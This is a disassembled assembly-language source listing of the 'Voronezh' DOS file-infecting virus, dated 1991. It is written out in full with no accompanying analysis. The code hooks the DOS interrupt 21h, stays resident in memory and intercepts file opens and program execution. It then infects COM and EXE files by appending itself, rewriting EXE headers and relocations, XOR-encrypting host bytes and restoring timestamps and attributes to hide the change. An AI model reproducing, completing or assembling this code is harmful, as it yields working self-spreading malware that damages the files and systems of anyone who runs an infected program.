
PAGE  59,132

;€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€
;€€								         €€
;€€			        VORONEZH			         €€
;€€								         €€
;€€      Created:   2-Mar-91					         €€
;€€      Passes:    5	       Analysis Options on: AJW		         €€
;€€								         €€
;€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€

data_1e		equ	1C2h
data_5e		equ	3
data_6e		equ	0
data_7e		equ	2
data_46e	equ	100h

seg_a		segment	byte public
		assume	cs:seg_a, ds:seg_a


		org	100h

voronezh	proc	far

start:
		mov	ax,ds
		push	cs
		pop	ds
		push	ax
		call	sub_1

voronezh	endp

;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_1		proc	near
		pop	bx
		sub	bx,108h
		push	bx
		mov	ah,0ABh
		int	21h			; ??INT Non-standard interrupt
		cmp	ax,5555h
		jne	loc_1			; Jump if not equal
		jmp	loc_10
loc_1:
		mov	ax,es
		sub	ax,1
		mov	ds,ax
		mov	bx,data_5e
		mov	ax,ds:[bx]
		sub	ax,0EAh
		mov	ds:[bx],ax
		push	es
		pop	ds
		mov	bx,data_7e
		mov	ax,ds:[bx]
		sub	ax,0EAh
		mov	ds:[bx],ax
		mov	es,ax
		mov	di,data_46e
		mov	si,100h
		pop	bx
		push	bx
		add	si,bx
		push	cs
		pop	ds
		mov	cx,6A4h
		rep	movsb			; Rep when cx >0 Mov [si] to es:[di]
		mov	dx,ax
		jmp	short loc_9
		nop
		pushf				; Push flags
		sti				; Enable interrupts
		cmp	ah,0ABh
		jne	loc_2			; Jump if not equal
		mov	ax,5555h
		popf				; Pop flags
		iret				; Interrupt return
loc_2:
		cmp	ax,3D00h
		jne	loc_5			; Jump if not equal
		push	ax
		push	bx
		push	cx
		push	dx
		push	si
		push	di
		push	es
		mov	cx,41h
		xor	al,al			; Zero register
		mov	di,dx
		push	ds
		pop	es
		repne	scasb			; Rep zf=0+cx >0 Scan es:[di] for al
		sub	di,4
		mov	si,di
		push	si
		push	cs
		pop	es
		mov	cx,4
		mov	di,289h
		repe	cmpsb			; Rep zf=1+cx >0 Cmp [si] to es:[di]
		cmp	cx,0
		jne	loc_3			; Jump if not equal
		pop	si
		jmp	short loc_4
		nop
loc_3:
		mov	di,28Ch
		mov	cx,4
		pop	si
		repe	cmpsb			; Rep zf=1+cx >0 Cmp [si] to es:[di]
		cmp	cx,0
loc_4:
		pop	es
		pop	di
		pop	si
		pop	dx
		pop	cx
		pop	bx
		pop	ax
		jz	loc_6			; Jump if zero
loc_5:
		push	ax
		inc	ah
		cmp	ax,4C00h
		pop	ax
		jnz	loc_8			; Jump if not zero
loc_6:
		push	ax
		push	bx
		push	cx
		push	dx
		push	si
		push	di
		push	es
		push	ds
		jmp	loc_16
loc_7:
		pop	ds
		pop	es
		pop	di
		pop	si
		pop	dx
		pop	cx
		pop	bx
		pop	ax
loc_8:
		popf				; Pop flags
;*		jmp	far ptr loc_49
		db	0EAh,0B5h, 02h, 46h,0D5h
loc_9:
		mov	ds,dx
		mov	ax,3521h
		int	21h			; DOS Services  ah=function 35h
						;  get intrpt vector al in es:bx
		mov	ds:data_1e,bx
		db	 3Eh, 8Ch, 06h,0C4h, 01h, 3Eh
		db	 89h, 1Eh, 75h, 03h, 3Eh, 8Ch
		db	 06h, 77h, 03h, 8Dh, 16h, 53h
		db	 01h,0B8h, 21h, 25h,0CDh
		db	21h
loc_10:
		pop	dx
		mov	bx,offset data_18
		add	bx,dx
		cmp	byte ptr cs:[bx],0
		je	loc_12			; Jump if equal
		pop	ds
		mov	ax,ds
		push	cs
		pop	ds
		mov	cx,dx
		pop	di
		pop	es
		push	ax
		sub	di,5
		mov	si,offset data_17
		add	si,cx
		mov	dl,[si]
		add	es:[di+5],dl
		cmp	es:[di+5],dl
		ja	loc_11			; Jump if above
		dec	si
		inc	byte ptr [si]
loc_11:
		mov	dx,di
		mov	si,offset data_16
		add	si,cx
		mov	cx,5
		rep	movsb			; Rep when cx >0 Mov [si] to es:[di]
		pop	ds
		push	es
		push	dx
		mov	ax,ds
		mov	es,ax
		xor	ax,ax			; Zero register
		xor	bx,bx			; Zero register
		xor	cx,cx			; Zero register
		xor	dx,dx			; Zero register
		xor	si,si			; Zero register
		xor	di,di			; Zero register
		retf				; Return far
loc_12:
		mov	ax,cs
		mov	ds,ax
		mov	es,ax
		mov	si,268h
		mov	cx,100h
		mov	bx,281h
		mov	di,[bx]
		cmp	di,0
		jne	loc_13			; Jump if not equal
		int	20h			; DOS program terminate
loc_13:
		mov	bx,283h
		mov	ax,[bx]
		add	di,ax
		add	di,100h
		cld				; Clear direction
		push	di
		rep	movsb			; Rep when cx >0 Mov [si] to es:[di]
		pop	di
		mov	cx,word ptr ds:[283h]
		mov	ax,word ptr ds:[281h]
		push	di
		retn
		add	ax,100h
		mov	si,ax
		mov	di,100h
		cld				; Clear direction

locloop_14:
		mov	al,[si]
		xor	al,0BBh
		mov	[di],al
		inc	si
		inc	di
		loop	locloop_14		; Loop if cx > 0

		mov	ax,offset start
		pop	bx
		push	ax
		retn
		inc	ax
		push	es
		inc	ax
		push	es
		push	si
		add	ax,0E2Bh
		inc	bp
		pop	ax
		inc	bp
		db	 65h, 78h, 65h, 55h, 76h, 7Fh
		db	'ctsqu`Voronezh,1990 2.01'
data_16		db	90h
		db	0B8h, 7Fh, 0Eh, 8Eh
data_17		db	0
data_18		db	0
data_19		dw	200h
data_20		dw	14Dh
data_21		db	0, 0, 0, 0, 0
data_22		dw	0
data_23		dw	34Dh
data_24		dw	0
data_25		dw	5D0h
data_26		db	9Ah
data_27		dw	5D0h
data_28		dw	0
data_29		dw	0
data_30		dw	1Eh
data_31		dw	100h
data_32		dw	100h
data_33		db	5
data_34		dw	20h
data_35		dw	0A956h
data_36		dw	41B9h

loc_ret_15:
		iret				; Interrupt return
loc_16:
		mov	bx,dx
		mov	ax,ds:[bx+3]
		cmp	ax,4F43h
		jne	$+5			; Jump if not equal
		jmp	loc_7
sub_1		endp

		mov	di,dx
		xor	ax,ax			; Zero register
		mov	cs:data_33,0
		db	 3Eh, 80h, 7Dh, 01h, 3Ah
		db	 75h, 09h, 3Eh, 8Ah, 05h, 24h
		db	 9Fh, 2Eh,0A2h,0CFh, 02h
loc_18:
		mov	ax,4300h
		int	21h			; DOS Services  ah=function 43h
						;  get attrb cx, filename @ds:dx
		mov	cs:data_34,cx
		mov	cs:data_35,ds
		mov	cs:data_36,dx
		push	ds
		push	dx
		push	es
		push	cs
		pop	ds
		mov	ax,3524h
		int	21h			; DOS Services  ah=function 35h
						;  get intrpt vector al in es:bx
		mov	word ptr ds:[285h],bx
		mov	word ptr ds:[287h],es
		mov	dx,offset loc_ret_15
		mov	ax,2524h
		int	21h			; DOS Services  ah=function 25h
						;  set intrpt vector al to ds:dx
		pop	es
		pop	dx
		pop	ds
		push	ds
		push	cs
		pop	ds
		mov	bx,100h
		mov	cx,740h
		sub	cx,bx
		mov	bx,283h
		mov	[bx],cx
		pop	ds
		mov	bx,dx
		push	ds
		push	dx
		push	bx
		push	cs
		pop	ds
		mov	ah,36h			; '6'
		mov	dl,data_33
		int	21h			; DOS Services  ah=function 36h
						;  get drive info, drive dl,1=a:
						;   returns ax=clust per sector
						;   bx=avail clust,cx=bytes/sect
						;   dx=clusters per drive
		cmp	ax,0FFFFh
		jne	loc_24			; Jump if not equal
loc_23:
		pop	ax
		pop	ax
		pop	ax
		call	sub_3
		jmp	loc_7
loc_24:
		mul	bx			; dx:ax = reg * ax
		mul	cx			; dx:ax = reg * ax
		or	dx,dx			; Zero ?
		jnz	loc_25			; Jump if not zero
		cmp	ax,word ptr ds:[283h]
		jb	loc_23			; Jump if below
loc_25:
		pop	bx
		pop	dx
		pop	ds
		mov	ax,3D00h
		pushf				; Push flags
		cli				; Disable interrupts
;*		call	far ptr sub_5
		db	 9Ah,0B5h, 02h, 46h,0D5h
		jnc	loc_26			; Jump if carry=0
		call	sub_3
		jmp	loc_7
loc_26:
		push	ax
		mov	ax,cs
		mov	ds,ax
		mov	es,ax
		pop	ax
		push	ax
		mov	bx,ax
		mov	ax,5700h
		int	21h			; DOS Services  ah=function 57h
						;  get file date+time, bx=handle
						;   returns cx=time, dx=time
		pop	ax
		push	cx
		push	dx
		push	ax
		mov	bx,ax
		mov	cx,0
		mov	dx,0
		mov	ah,42h			; 'B'
		mov	al,2
		int	21h			; DOS Services  ah=function 42h
						;  move file ptr, bx=file handle
						;   al=method, cx,dx=offset
		mov	bx,281h
		mov	[bx],ax
		mov	bx,283h
		mov	cx,[bx]
		mov	cx,0
		mov	dx,0
		mov	ax,4200h
		pop	bx
		push	bx
		int	21h			; DOS Services  ah=function 42h
						;  move file ptr, bx=file handle
						;   al=method, cx,dx=offset
		mov	bx,283h
		mov	cx,[bx]
		pop	bx
		push	bx
		mov	dx,offset data_37
		mov	ah,3Fh			; '?'
		int	21h			; DOS Services  ah=function 3Fh
						;  read file, bx=file handle
						;   cx=bytes to ds:dx buffer
		mov	si,offset data_37
		mov	cx,[si]
		cmp	cx,0D88Ch
		jne	loc_27			; Jump if not equal
		pop	bx
		pop	ax
		pop	ax
		call	sub_2
		jmp	loc_7
loc_27:
		cmp	cx,5A4Dh
		je	loc_28			; Jump if equal
		jmp	loc_44
loc_28:
		pop	bx
		push	bx
		mov	ax,4200h
		xor	cx,cx			; Zero register
		xor	dx,dx			; Zero register
		int	21h			; DOS Services  ah=function 42h
						;  move file ptr, bx=file handle
						;   al=method, cx,dx=offset
		mov	cx,32h
		mov	ax,3F00h
		lea	dx,data_37		; Load effective addr
		int	21h			; DOS Services  ah=function 3Fh
						;  read file, bx=file handle
						;   cx=bytes to ds:dx buffer
		mov	ax,data_39
		mov	cx,4
		mul	cx			; dx:ax = reg * ax
		mov	bx,data_44
		add	ax,bx
		mov	dx,ax
		mov	di,dx
		mov	ax,data_40
		mov	cx,10h
		mul	cx			; dx:ax = reg * ax
		mov	dx,di
		add	dx,4
		cmp	ax,dx
		ja	loc_29			; Jump if above
		jmp	loc_43
loc_29:
		mov	data_19,ax
		mov	ax,data_39
		inc	ax
		mov	data_39,ax
		mov	ax,data_42
		mov	data_20,ax
		mov	ax,data_43
		mov	word ptr data_21,ax
		xor	dx,dx			; Zero register
		xor	cx,cx			; Zero register
		mov	ax,4202h
		pop	bx
		push	bx
		int	21h			; DOS Services  ah=function 42h
						;  move file ptr, bx=file handle
						;   al=method, cx,dx=offset
		push	ax
		push	dx
		add	ax,word ptr ds:[283h]
		cmp	ax,word ptr ds:[283h]
		ja	loc_30			; Jump if above
		inc	dx
loc_30:
		mov	cx,200h
		div	cx			; ax,dx rem=dx:ax/reg
		cmp	dx,0
		je	loc_31			; Jump if equal
		inc	ax
loc_31:
		mov	bx,data_38
		mov	cx,ax
		sub	cx,bx
		cmp	cx,5
		jb	loc_32			; Jump if below
		pop	ax
		pop	ax
		jmp	loc_43
loc_32:
		mov	data_38,ax
		pop	dx
		pop	ax
		mov	bx,data_19
		cmp	ax,bx
		jb	loc_33			; Jump if below
		sub	ax,bx
		jmp	short loc_34
		nop
loc_33:
		sub	ax,bx
		dec	dx
loc_34:
		mov	data_24,dx
		mov	data_25,ax
		mov	ax,data_19
		mov	bx,data_20
		mov	dx,0
		add	ax,bx
		cmp	ax,bx
		ja	loc_35			; Jump if above
		inc	dx
loc_35:
		mov	si,ax
		mov	di,dx
		mov	ax,word ptr data_21
		mov	cx,10h
		mul	cx			; dx:ax = reg * ax
		add	di,dx
		add	si,ax
		cmp	si,ax
		ja	loc_36			; Jump if above
		inc	di
loc_36:
		mov	ax,si
		mov	dx,di
		mov	data_22,dx
		mov	data_23,ax
		mov	cx,dx
		mov	dx,ax
		mov	ax,4200h
		mov	data_18,1
		mov	data_17,0
		pop	bx
		push	bx
		int	21h			; DOS Services  ah=function 42h
						;  move file ptr, bx=file handle
						;   al=method, cx,dx=offset
		mov	cx,5
		lea	dx,data_16		; Load effective addr
		mov	ax,3F00h
		int	21h			; DOS Services  ah=function 3Fh
						;  read file, bx=file handle
						;   cx=bytes to ds:dx buffer
		cmp	data_16,9Ah
		jne	loc_37			; Jump if not equal
		jmp	loc_43
loc_37:
		call	sub_4
		mov	bx,data_44
		mov	ax,data_39
		dec	ax
		mov	cx,4
		mul	cx			; dx:ax = reg * ax
		add	bx,ax
		mov	cx,0
		mov	dx,bx
		mov	ax,4200h
		pop	bx
		push	bx
		int	21h			; DOS Services  ah=function 42h
						;  move file ptr, bx=file handle
						;   al=method, cx,dx=offset
		mov	dx,data_20
		add	dx,3
		mov	data_20,dx
		lea	dx,data_20		; Load effective addr
		mov	cx,4
		mov	ah,40h			; '@'
		pop	bx
		push	bx
		int	21h			; DOS Services  ah=function 40h
						;  write file  bx=file handle
						;   cx=bytes from ds:dx buffer
		mov	dx,data_20
		sub	dx,3
		mov	data_20,dx
		xor	dx,dx			; Zero register
		xor	cx,cx			; Zero register
		mov	ax,4200h
		pop	bx
		push	bx
		int	21h			; DOS Services  ah=function 42h
						;  move file ptr, bx=file handle
						;   al=method, cx,dx=offset
		mov	cx,data_44
		lea	dx,data_37		; Load effective addr
		mov	ah,40h			; '@'
		int	21h			; DOS Services  ah=function 40h
						;  write file  bx=file handle
						;   cx=bytes from ds:dx buffer
		mov	data_26,9Ah
		mov	ax,data_25
		mov	data_27,ax
		mov	ax,data_24
		mov	cx,1000h
		mul	cx			; dx:ax = reg * ax
		mov	data_28,ax
		cmp	data_27,0F000h
		jb	loc_38			; Jump if below
		mov	ax,data_27
		mov	dx,data_28
		add	dx,100h
		sub	ax,1000h
		mov	data_28,dx
		mov	data_27,ax
loc_38:
		mov	cx,data_22
		mov	dx,data_23
		mov	ax,4200h
		pop	bx
		push	bx
		int	21h			; DOS Services  ah=function 42h
						;  move file ptr, bx=file handle
						;   al=method, cx,dx=offset
		mov	cx,5
		mov	ah,40h			; '@'
		lea	dx,data_26		; Load effective addr
		int	21h			; DOS Services  ah=function 40h
						;  write file  bx=file handle
						;   cx=bytes from ds:dx buffer
		mov	cx,0
		mov	dx,0
		mov	ax,4202h
		pop	bx
		push	bx
		int	21h			; DOS Services  ah=function 42h
						;  move file ptr, bx=file handle
						;   al=method, cx,dx=offset
		mov	ah,40h			; '@'
		mov	cx,word ptr ds:[283h]
		mov	dx,100h
		int	21h			; DOS Services  ah=function 40h
						;  write file  bx=file handle
						;   cx=bytes from ds:dx buffer
		xor	cx,cx			; Zero register
		mov	dx,data_44
		mov	ax,4200h
		pop	bx
		push	bx
		int	21h			; DOS Services  ah=function 42h
						;  move file ptr, bx=file handle
						;   al=method, cx,dx=offset
		mov	data_32,0
		mov	data_29,dx
		mov	data_30,ax
		mov	ax,data_39
		mov	di,0
		dec	ax
		cmp	ax,0
		jne	loc_39			; Jump if not equal
		jmp	loc_43
loc_39:
		mov	cx,4
		mul	cx			; dx:ax = reg * ax
		mov	si,ax
loc_40:
		mov	cx,0
		mov	dx,0
		mov	ax,4201h
		int	21h			; DOS Services  ah=function 42h
						;  move file ptr, bx=file handle
						;   al=method, cx,dx=offset
		mov	data_29,dx
		mov	data_30,ax
		mov	cx,100h
		mov	dx,data_6e
		mov	ax,3F00h
		int	21h			; DOS Services  ah=function 3Fh
						;  read file, bx=file handle
						;   cx=bytes to ds:dx buffer
		mov	di,data_6e
		mov	data_31,ax
		add	data_32,ax
loc_41:
		mov	ax,[di+2]
		cmp	ax,word ptr data_21
		jne	loc_42			; Jump if not equal
		mov	ax,[di]
		cmp	ax,data_20
		jb	loc_42			; Jump if below
		mov	ax,data_20
		add	ax,5
		cmp	ax,[di]
		jbe	loc_42			; Jump if below or =
		mov	ax,data_28
		mov	[di+2],ax
		mov	ax,[di]
		mov	bx,data_20
		sub	ax,bx
		push	ax
		mov	ax,2AAh
		sub	ax,100h
		mov	bx,data_27
		add	ax,bx
		pop	bx
		add	ax,bx
		mov	[di],ax
		mov	cx,data_29
		mov	dx,data_30
		mov	ax,4200h
		pop	bx
		push	bx
		int	21h			; DOS Services  ah=function 42h
						;  move file ptr, bx=file handle
						;   al=method, cx,dx=offset
		mov	cx,data_31
		mov	ah,40h			; '@'
		pop	bx
		push	bx
		mov	dx,data_6e
		int	21h			; DOS Services  ah=function 40h
						;  write file  bx=file handle
						;   cx=bytes from ds:dx buffer
		jmp	short loc_43
		nop
loc_42:
		add	di,4
		mov	ax,data_32
		sub	ax,100h
		add	ax,di
		cmp	ax,si
		je	loc_43			; Jump if equal
		cmp	di,data_31
		jb	loc_41			; Jump if below
		jmp	loc_40
loc_43:
		jmp	short loc_48
		nop
loc_44:
		mov	cx,word ptr ds:[281h]
		cmp	cx,0EE48h
		jb	loc_46			; Jump if below
loc_45:
		pop	bx
		pop	ax
		pop	ax
		call	sub_2
		jmp	loc_7
loc_46:
		cmp	cx,word ptr ds:[283h]
		jb	loc_45			; Jump if below
		call	sub_4
		mov	data_18,0
		mov	dx,0
		mov	cx,0
		mov	ax,4202h
		pop	bx
		push	bx
		int	21h			; DOS Services  ah=function 42h
						;  move file ptr, bx=file handle
						;   al=method, cx,dx=offset
		mov	si,283h
		mov	cx,[si]
		mov	ah,40h			; '@'
		push	cx
		mov	bx,offset data_37

locloop_47:
		mov	al,[bx]
		xor	al,0BBh
		mov	[bx],al
		inc	bx
		loop	locloop_47		; Loop if cx > 0

		pop	cx
		pop	bx
		push	bx
		mov	dx,offset data_37
		int	21h			; DOS Services  ah=function 40h
						;  write file  bx=file handle
						;   cx=bytes from ds:dx buffer
		mov	ax,4200h
		mov	dx,0
		mov	cx,0
		int	21h			; DOS Services  ah=function 42h
						;  move file ptr, bx=file handle
						;   al=method, cx,dx=offset
		mov	bx,110h
		mov	si,283h
		mov	cx,[si]
		mov	dx,100h
		mov	ah,40h			; '@'
		pop	bx
		push	bx
		int	21h			; DOS Services  ah=function 40h
						;  write file  bx=file handle
						;   cx=bytes from ds:dx buffer
loc_48:
		pop	bx
		pop	dx
		pop	cx
		push	bx
		mov	ax,5701h
		int	21h			; DOS Services  ah=function 57h
						;  set file date+time, bx=handle
						;   cx=time, dx=time
		mov	dx,data_36
		mov	ds,data_35
		mov	ax,4301h
		mov	cx,cs:data_34
		int	21h			; DOS Services  ah=function 43h
						;  set attrb cx, filename @ds:dx
		push	cs
		pop	ds
		pop	bx
		call	sub_2
		jmp	loc_7

;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_2		proc	near
		mov	ax,3E00h
		int	21h			; DOS Services  ah=function 3Eh
						;  close file, bx=file handle

;ﬂﬂﬂﬂ External Entry into Subroutine ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ

sub_3:
		mov	bx,word ptr ds:[285h]
		mov	es,word ptr ds:[287h]
		mov	ax,2524h
		int	21h			; DOS Services  ah=function 25h
						;  set intrpt vector al to ds:dx
		retn
sub_2		endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_4		proc	near
		push	bp
		mov	bp,sp
		push	ds
		mov	ax,4301h
		mov	dx,data_36
		mov	ds,data_35
		xor	cx,cx			; Zero register
		int	21h			; DOS Services  ah=function 43h
						;  set attrb cx, filename @ds:dx
		jnc	$+8			; Jump if carry=0
		pop	ds
		pop	bp
		pop	ax
		jmp	loc_43
sub_4		endp

		db	 36h, 8Bh, 5Eh, 04h,0B8h, 00h
		db	 3Eh,0CDh, 21h,0B8h, 02h, 3Dh
		db	0FAh, 9Ch, 2Eh,0FFh, 1Eh,0C2h
		db	 01h, 1Fh, 36h, 89h, 46h, 04h
		db	 5Dh,0C3h
data_37		db	3
		db	0BBh,0F7h, 76h
data_38		dw	0BB9Ah
data_39		dw	0BBBBh
data_40		dw	0BBBBh
		db	10 dup (0BBh)
data_42		dw	0BBBBh
data_43		dw	0BBBBh
data_44		dw	0BBBBh
		db	1574 dup (0BBh)

seg_a		ends



		end	start
